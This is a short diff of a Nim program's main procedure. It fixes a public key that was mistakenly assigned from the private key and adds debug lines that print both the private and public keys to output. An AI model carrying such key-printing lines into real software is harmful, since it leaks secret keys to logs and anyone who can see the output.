@@ -63,8 +63,11 @@ proc main() =
   let encConfig = ub64Str.fromFlatty(EncConfig)
   let context = readEncConfig(encConfig)
   
-  let pubKey = encConfig.privKey
+  let pubKey = encConfig.pubKey
   let privKey = encConfig.privKey
+  echo "privKey: ", privKey
+  echo "pubKey: ", pubKey
+
   echo context.callback
   while(true):
     # try: 
